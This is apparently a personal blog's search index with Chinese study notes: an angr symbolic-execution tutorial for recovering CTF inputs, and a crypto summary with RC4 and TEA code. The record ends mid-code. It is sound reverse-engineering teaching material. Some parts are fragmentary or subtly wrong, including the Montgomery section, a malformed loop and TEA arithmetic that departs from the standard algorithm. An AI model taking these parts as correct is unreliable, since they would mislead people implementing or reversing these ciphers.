<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Angr Learning Note</title>
    <url>/2023/10/20/Angr%20Learning%20Note/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
迈向自动化的第二步——
</blockquote>
<span id="more"></span>
<h1 id="xff-reference">0xFF Reference</h1>
<p><a href="https://heygap.github.io/2023/09/30/blog9/#more">1. Symbolic
Execution Leaning Note (1) -- Basis</a><br />
<a href="https://xz.aliyun.com/t/7117#toc-22">2.
2020年Angr-Api非官方介绍</a><br />
<a
href="https://github.com/jakespringer/angr_ctf/blob/master/SymbolicExecution.pptx">3.
angr_ctf里介绍angr的ppt(讲的真的挺好的)</a></p>
<h1 id="x00-recall-symbolic-execution">0x00 Recall-Symbolic
Execution</h1>
<p>笔者水平有限，如有错误请指出 ;-)</p>
<p>我们先回顾一下什么是符号执行：<br />
我们在逆向一个程序、去找一个程序的漏洞时，我们会希望找到一个<code>input</code>,来触发我们需要的漏洞或者找到我们需要的flag，而符号执行的功能就是<strong>通过遍历程序所有可能的“状态(State)”，找到我们需要的State，进而通过约束求解器，求解出我们最后需要的input</strong></p>
<p>宏观上看，符号执行可以分为<code>三步</code><br />
1. 注入符号 2. 分支 3. 执行分支</p>
<p>我们用一个简单的函数来分别看一下这三步是什么 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// demo func</span><br><span class="line"></span><br><span class="line">Line1  void check_func(char* passwd)</span><br><span class="line">Line2  &#123;</span><br><span class="line">Line3      if(passwd == &quot;HeyGap&quot;)</span><br><span class="line">Line4          printf(&quot;Access granted&quot;);</span><br><span class="line">Line5      else</span><br><span class="line">Line6          printf(&quot;Access denied&quot;);</span><br><span class="line">Line7  &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="注入符号inject-symbols">1. 注入符号(Inject Symbols)</h3>
<ul>
<li>什么是注入符号？<br />
我们在<code>具体执行</code>的时候，传入的passwd是一个具体的字符串；可我们在<code>符号执行</code>时，传入的是一个<code>符号</code>。</li>
<li>什么是符号？
类比于我们小学学的方程<code>x + 1 = 2</code>，我们可以通过这样一个方程来求解出变量x，我们也称“这个方程约束了这个变量x”；而<code>符号</code>就是方程中的<code>变量</code>，用来约束符号的<code>执行路径</code>就可以类比成<code>方程</code></li>
<li>什么是执行路径？<br />
从State_A到State_B的<code>执行路径</code>就是<strong>从起点A可以执行到终点B的一条指令(instructions)路径</strong>,在每条执行路径中都会维护一个符号变量<code>pc</code>，pc记录了“从A点出发，要到达B的全部条件”，这个符号变量的类型是逻辑表达式，我们可以将这个符号变量扔到SMT求解器（比如z3）中去求解满足这个符号变量中所有约束条件的1~n个解</li>
<li>Example<br />
在上述例子中，我们将一个符号传入passwd中，就是注入符号。</li>
</ul>
<h3 id="分支branching">2. 分支(Branching)</h3>
<ul>
<li>什么是branching<br />
由于我们的符号是一个待确定的值，所以我们在遇到<code>判断语句</code>时，当前的State会设置为执行完毕(already
executed)，然后激活(active)两个新的state，由于要遍历全部state，符号在判断语句中得到不同返回值，而这两个state就是不同返回值进入的不同分支的起始状态</li>
<li>Example
在上述例子中，可以理解为Line1-2为state1，当执行到Line3时，state1设置为执行完毕，同时激活state2和state3，state2为Line4，state3为Line6</li>
</ul>
<h3 id="评估分支evaluate-each-branches">3. 评估分支(Evaluate Each
Branches)</h3>
<ul>
<li>什么是Evaluate Branches？<br />
我们会评估(Evaluate)每一个active的state，判断他们是否符合我们的需求，如果不满足就设置terminated，如果遇到判断语句就进入第二步</li>
<li>Example
假设当前激活的state为2和3，如果我们需要“标准输出中包含'granted'”，那符号执行器就会评估state2，发现这个state符合我们的要求，于是将state2加到found数组中；然后再评估state3，发现不符合，设置为terminated</li>
</ul>
<h1 id="x01-an-introduction-to-angr">0x01 An Introduction to Angr</h1>
<h3 id="出现的class">1. 出现的class</h3>
<p>笔者在此记录相对重要的class，读者可以通过阅读源码或官方手册等方式，先弄清楚这些class的作用
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SimState</span><br><span class="line">Simulation Manager(simgr)</span><br></pre></td></tr></table></figure></p>
<h3 id="symbolic-execution-in-angr">2. Symbolic Execution In Angr</h3>
<p>通过0x00，我们知道在符号执行中，<code>执行路径</code>和<code>符号</code>是最重要的两个东西
- Angr中的执行路径<br />
1.
我们知道每branch一次，就会添加两个state，而在Angr中，维护路径信息的pc由<code>SimState</code>
Object组成，SimState用∩链在一起就组成了pc 2.
由于我们要遍历全部state，所以我们需要有一个管理器来管理全部执行路径(a
Set of
Path)，这个管理器就是<code>Simulation Manager (simgr)</code>,下图为Angr中生成全部路径的过程
<img src="/pic/1.png" /> 3.
上图提到<code>until we find what we want</code>，simgr提供了函数<code>explore</code>，可以让我们通过两种方式来找到我们需要的state<br />
1. 通过指令在text段的地址 2. 通过任意体现state特征的函数</p>
<ul>
<li>State Explosion
<ol type="1">
<li>但是单纯的遍历每一条路径会存在状态爆炸(State
Explosion，有些地方也叫路径爆炸)的问题，来看下面这个循环
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x；</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(x &gt; <span class="number">10</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Good&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>当i=1时，管理器会创建两个state，而i=2时，先前的两个state有分别会创建两个state，当i=100时，我们就会出现2^100个state，这就是状态爆炸问题</li>
<li>而explore也为我们提供了一个参数avoid，效果就是<code>剪枝</code>，在explore中添加avoid参数会帮助我们提前terminate那些我们不需要的state，因此这个state后续的branch就不会再跟进</li>
</ol></li>
</ul>
<h1 id="x01-库架构分析">0x01 库架构分析</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">angr</span><br><span class="line"> | - Project()</span><br><span class="line">		 | - factory</span><br><span class="line">				 | - state</span><br><span class="line">					   | - entry_state()</span><br><span class="line">					   | - blank_state(addr)</span><br><span class="line"></span><br><span class="line">					   | - regs.eax/ebx/...</span><br><span class="line">					   | - solver</span><br><span class="line">							  | - BVS</span><br><span class="line">							  | - eval</span><br><span class="line">					   | - fs</span><br><span class="line">						    | - insert(string filename,angr.storage.SimFile())</span><br><span class="line">				 | - simulation_manager(init_state)</span><br><span class="line">						 | - explore(find,avoid)</span><br><span class="line">						 | - found[]</span><br><span class="line"></span><br><span class="line"> | - storage</span><br><span class="line">		 | - SimFile(filename,content,size)</span><br><span class="line"> | - sim_options</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_MEMORY</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_REGISTERS</span><br><span class="line"></span><br><span class="line">found_state</span><br><span class="line">	 | - posix</span><br><span class="line">		   | - dumps(std)</span><br><span class="line">	 | - solver</span><br><span class="line">		   | - eval(claripy.BVS pass,cast_to)</span><br></pre></td></tr></table></figure>
<h1 id="x02-api手册">0x02 API手册</h1>
<ul>
<li><strong>Project类(参数、功能、重载、返回值)</strong>
<ol type="1">
<li>构造函数参数：“命令行中运行程序的指令”(eg: "./00_angr_find")</li>
<li>功能：“构建一个符号执行项目”</li>
<li>附属成员
<ul>
<li><strong>factory</strong>
<ol type="1">
<li>附属成员
<ul>
<li><strong>state</strong>
<ol type="1">
<li>重载函数
<ul>
<li><strong>entry_state()</strong>
<ol type="1">
<li>返回值：程序入口点</li>
</ol></li>
<li><strong>blank_state(addr)</strong>
<ol type="1">
<li>参数：模拟执行开始的地址</li>
</ol></li>
</ul></li>
<li>附属成员
<ul>
<li><strong>regs</strong>
<ol type="1">
<li>附属成员: 各种寄存器</li>
</ol></li>
<li><strong>fs</strong>
<ol type="1">
<li>全称: filesystem</li>
<li>附属成员：
<ul>
<li><strong>insert(string filename,angr.storage.simFile)</strong>
<ol type="1">
<li>参数1：文件名称</li>
<li>参数2：创建过的符号化文件对象</li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
<li><strong>simulation_manager类</strong>
<ol type="1">
<li>构造函数参数：起始状态</li>
<li>功能：设置模拟执行的起始地址，并返回实例化对象</li>
<li>附属成员
<ul>
<li><strong>explore(find, avoid)</strong>
<ol type="1">
<li>参数find：希望程序抵达的地址</li>
<li>参数avoid：希望程序不抵达的地址</li>
<li>功能：用符号探索到find指向的地址，并避免avoid指向的地址</li>
<li>重载：explore(find=func1,avoid=func2) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func1(state):</span><br><span class="line">	return b&quot;Good Job!&quot; in state.posix.dumps(1)</span><br><span class="line">def func2(state):</span><br><span class="line">	return b&quot;Try Again!&quot; in state.posix.dumps(1)</span><br></pre></td></tr></table></figure>
<ol type="1">
<li>功能：探索具有func1特征的的函数分支，回避具有func2特征的函数分支</li>
</ol></li>
</ol></li>
<li><strong>found数组</strong>
<ol type="1">
<li>found_state的实例化数组</li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
<li><strong>found_state类</strong>
<ul>
<li><strong>posix</strong>
<ul>
<li><strong>dumps(int std)</strong>
<ol type="1">
<li>参数std: stdin(0)/stdout(1)/stderr(2)</li>
<li>功能: 将std指向的内容打印出来</li>
</ol></li>
</ul></li>
<li>solver
<ul>
<li>eval(claripy.BVS arg1)
<ol type="1">
<li>参数：要求解的约束公式</li>
<li>功能：求解arg1并返回结果</li>
</ol></li>
</ul></li>
</ul></li>
<li><strong>claripy类</strong>
<ul>
<li><strong>BVS类</strong>
<ol type="1">
<li>构造函数参数：arg1: 别名 | arg2: 符号向量占多少位</li>
<li>功能：构建一个空的约束公示</li>
</ol></li>
</ul></li>
<li><strong>storage类</strong>
<ul>
<li>SimFile(filename,content,size)
<ol type="1">
<li>参数filename：要引入的filename</li>
<li>参数content：符号化向量</li>
<li>参数size：要从文件中读取的字节数*8（单位：bits）</li>
<li>功能：创建一个符号化的文件对象</li>
</ol></li>
</ul></li>
<li><strong>sim_options类</strong>
<ul>
<li>SYMBOL_FILL_UNCONSTRAINED_MEMORY
<ul>
<li>功能：自动用符号填充未约束的内存（模拟过程中没有明确值的内存位置）</li>
</ul></li>
<li>SYMBOL_FILL_UNCONSTRAINED_REGISTERS
<ul>
<li>功能：自动用符号填充未约束的寄存器</li>
</ul></li>
</ul></li>
</ul>
<h1 id="x01-angr语法">0x01 Angr语法</h1>
<h3 id="准备阶段">1. 准备阶段</h3>
<ul>
<li><p><strong>引入与初始化</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(exec_path)</span><br><span class="line"></span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"><span class="comment"># init_state = p.factory.blank_state(addr) # addr = 0xbeef</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>命令行引入参数</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">	arg1 = argv[<span class="number">1</span>]</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main(sys.argv)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>符号向量</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">pass1 = claripy.BVS(<span class="string">&#x27;pass1&#x27;</span>, <span class="number">32</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>符号化寄存器</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init_state.regs.eax = pass1</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>符号化文件</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filename = <span class="string">&quot;&quot;</span></span><br><span class="line">filesize = </span><br><span class="line"></span><br><span class="line">password = init_state.solver.BVS(<span class="string">&#x27;password&#x27;</span>,filesize*<span class="number">8</span>)</span><br><span class="line">sim_file = angr.storage.SimFile(filename,content=password,size=filesize)</span><br><span class="line"></span><br><span class="line">init_state.fs.insert(sim_file)</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h3 id="探索阶段">2. 探索阶段</h3>
<ul>
<li><p><strong>探索指定地址并查看标准流</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sm.explore(find = addr_to_find)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>利用函数explore分支</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">state</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="string">b&quot;Good Job!&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">state</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="string">b&quot;Try Again!&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good, avoid=is_bad)</span><br><span class="line"><span class="comment"># sm.explore(find=addr_find, avoid=addr_avoid)</span></span><br></pre></td></tr></table></figure></p></li>
</ul>
<h3 id="输出阶段">3. 输出阶段</h3>
<ul>
<li><p><strong>查看结果</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">	found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;[x] Solution: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(found_state.posix.dumps(<span class="number">0</span>)))</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>求解寄存器的符号向量</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = init_state.solver.<span class="built_in">eval</span>(BVS)</span><br></pre></td></tr></table></figure></p></li>
</ul>
]]></content>
      <categories>
        <category>Software analysis technology</category>
      </categories>
      <tags>
        <tag>SymbolicExecution</tag>
      </tags>
  </entry>
  <entry>
    <title>Math Knowledge Summary</title>
    <url>/2024/02/06/CSBasics%20-%20Math%20Knowledge%20Summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下计算机中的数学相关内容，便于后续调用
</blockquote>
<span id="more"></span>
<h1 id="目录">[0] 目录</h1>
<ol type="1">
<li><p><a href="">数学算法</a></p></li>
<li><p><a href="">密码学</a></p>
<ol type="1">
<li><p><a href="#1-stream-cipher">Stream Cipher</a></p>
<ul>
<li><a href="#1-1-rc4">1-1 RC4</a></li>
</ul></li>
<li><p><a href="#2-block-cipher">Block Cipher</a></p>
<ul>
<li><a href="#2-1-teaxteaxxtea">2-1 tea/xtea/xxtea</a></li>
</ul></li>
</ol></li>
</ol>
<h1 id="math">[1] MATH</h1>
<h2 id="模乘">[1-1] 模乘</h2>
<h3 id="蒙哥马利算法">[1-1-1] 蒙哥马利算法</h3>
<p>按照笔算的思维，计算模乘需要进行一次乘法，再进行一次除法。但除法对计算来说不是很友好，我们希望减少除法的次数（其实除法模块就是乘法/加法/减法的组合），因此我们可以使用蒙哥马利模乘(MMF)，蒙哥马利模乘就是一次乘法+两次蒙哥马利约简(REDC)</p>
<p>假设我们要计算 <span class="math inline">\(a*b \mod N\)</span>，</p>
<p>，<span class="math inline">\(aR^{-1} = REDC(x)\)</span>，R
满足GCD</p>
<p>而蒙哥马利模乘其实就是，下文将记 x 的蒙哥马利约简为 REDC(x)</p>
<h1 id="stream-cipher">[1] Stream Cipher</h1>
<h2 id="rc4">[1-1] RC4</h2>
<h3 id="基本原理">[1-1-1] 基本原理</h3>
<p>加密: 明文与 keystream 异或得到密文</p>
<p>密文: 密文与 keystream 异或得到明文</p>
<p>keystream 与明文等长</p>
<p>由于 RC4 采取逐位异或的加密方式，只要我们知道了密文和key，只需要放到
cyberchef 里再加密一次就能得到原文</p>
<h3 id="生成密钥流keystream">[1-1-2] 生成密钥流（keystream）</h3>
<p>RC4 的密钥流生成由两部分组成：</p>
<ol type="1">
<li><p>KSA（the Key-Scheduling Algorithm）</p></li>
<li><p>PRGA（the Pseudo-Random Generation Algorithm）</p></li>
</ol>
<p><strong>KSA: 利用key生成S盒</strong> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> T[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">    Sbox[i] = i;</span><br><span class="line">    T[i] = key[ i % key_length ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">    j = (j + Sbox[i] + T[i]) % SBOX_LEN;</span><br><span class="line">    swap(&amp;Sbox[i], &amp;Sbox[j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>PRGA: 利用S盒生成密钥流</strong> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; data_len; k++) &#123;</span><br><span class="line">    i = (i + <span class="number">1</span>) % SBOX_LEN;</span><br><span class="line">    j = (j + Sbox[i]) % SBOX_LEN;</span><br><span class="line">    swap(&amp;Sbox[i], &amp;Sbox[j]);</span><br><span class="line">    t = (Sbox[i] + Sbox[j]) % SBOX_LEN;</span><br><span class="line">    puc_key_stream[k] = Sbox[t];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="完整代码">[1-1-3] 完整代码</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBOX_LEN 256</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rc4_encrypt rc4_crypt</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rc4_decrypt rc4_crypt</span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">swap_uchar</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_x, <span class="type">unsigned</span> <span class="type">char</span> *puc_y)</span></span><br><span class="line">&#123;</span><br><span class="line">    *puc_x = *puc_x ^ *puc_y;</span><br><span class="line">    *puc_y = *puc_x ^ *puc_y;</span><br><span class="line">    *puc_x = *puc_x ^ *puc_y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_data, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, puc_data[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 利用Key生成S盒</span></span><br><span class="line"><span class="comment"> * the Key-Scheduling Algorithm</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">rc4_ksa</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_sbox, <span class="type">unsigned</span> <span class="type">char</span> *puc_key, <span class="type">int</span> key_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> tmp[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">        puc_sbox[i] = i;</span><br><span class="line">        tmp[i] = puc_key[i % key_length];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">        j = (j + puc_sbox[i] + tmp[i]) % SBOX_LEN;</span><br><span class="line">        swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]); <span class="comment">//交换puc_sbox[i]和puc_sbox[j]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 利用S盒生成密钥流</span></span><br><span class="line"><span class="comment"> * The pseudo-random generation algorithm(PRGA)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">rc4_prga</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_sbox, <span class="type">unsigned</span> <span class="type">char</span> *puc_key_stream, <span class="type">unsigned</span> <span class="type">long</span> ul_data_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; ul_data_length; k++) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % SBOX_LEN;</span><br><span class="line">        j = (j + puc_sbox[i]) % SBOX_LEN;</span><br><span class="line">        swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]);</span><br><span class="line">        t = (puc_sbox[i] + puc_sbox[j]) % SBOX_LEN;</span><br><span class="line">        <span class="comment">/* 为了更清晰理解rc4算法流程，此处保存keystream，不直接进行XOR运算 */</span></span><br><span class="line">        puc_key_stream[k] = puc_sbox[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 加解密 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_data, <span class="type">unsigned</span> <span class="type">char</span> *puc_key_stream, <span class="type">unsigned</span> <span class="type">long</span> ul_data_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> i = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 把PRGA算法放在加解密函数中可以不需要保存keystream */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ul_data_length; i++) &#123;</span><br><span class="line">        puc_data[i] ^= puc_key_stream[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> sbox[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> key[SBOX_LEN] = &#123;<span class="string">&quot;HeyGap&quot;</span>&#125;; <span class="comment">//秘钥内容随便定义</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">512</span>] = <span class="string">&quot;HeyGap&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> puc_keystream[<span class="number">512</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ul_data_length = <span class="built_in">strlen</span>(data);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key=%s, length=%d\n\n&quot;</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Raw data string:%s\n&quot;</span>, data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Raw data hex:\n&quot;</span>);</span><br><span class="line">    hexdump(data, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 生成S-box */</span></span><br><span class="line">    rc4_ksa(sbox, (<span class="type">unsigned</span> <span class="type">char</span> *)key, <span class="built_in">strlen</span>(key));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 生成keystream并保存,S-box也会被更改 */</span></span><br><span class="line">    rc4_prga(sbox, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;S-box final status:\n&quot;</span>);</span><br><span class="line">    hexdump(sbox, <span class="keyword">sizeof</span>(sbox));</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key stream:\n&quot;</span>);</span><br><span class="line">    hexdump(puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 加密 */</span></span><br><span class="line">    rc4_encrypt((<span class="type">unsigned</span> <span class="type">char</span>*)data, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cipher hexdump:\n&quot;</span>);</span><br><span class="line">    hexdump(data, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 解密 */</span></span><br><span class="line">    rc4_decrypt((<span class="type">unsigned</span> <span class="type">char</span>*)data, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;decypt data:%s\n&quot;</span>, data);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="block-cipher">[2] Block Cipher</h1>
<h2 id="teaxteaxxtea">[2-1] Tea/xTea/xxTea</h2>
<h3 id="tea-decrypt">[2-1-1] Tea decrypt</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;<span class="number">1234</span>,<span class="number">2341</span>,<span class="number">3412</span>,<span class="number">4123</span>&#125;;</span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">0xDEADBEEF</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">uint32_t</span> *encrypted)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> enc_tmp1 = encrypted[<span class="number">0</span>],enc_tmp2 = encrypted[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++) &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++) &#123;</span><br><span class="line">        enc_tmp2 -= (sum + enc_tmp1) ^ (<span class="number">16</span> * enc_tmp1 + key[<span class="number">2</span>]) ^ (<span class="number">32</span> * enc_tmp1 + key[<span class="number">3</span>]);</span><br><span class="line">        enc_tmp1 -= (sum + enc_tmp2) ^ (<span class="number">16</span> * enc_tmp2 + key[<span class="number">0</span>]) ^ (<span class="number">32</span> * enc_tmp2 + key[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    encrypted[<span class="number">0</span>] = enc_tmp1;</span><br><span class="line">    encrypted[<span class="number">1</span>] = enc_tmp2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> encflag[] = &#123;</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span 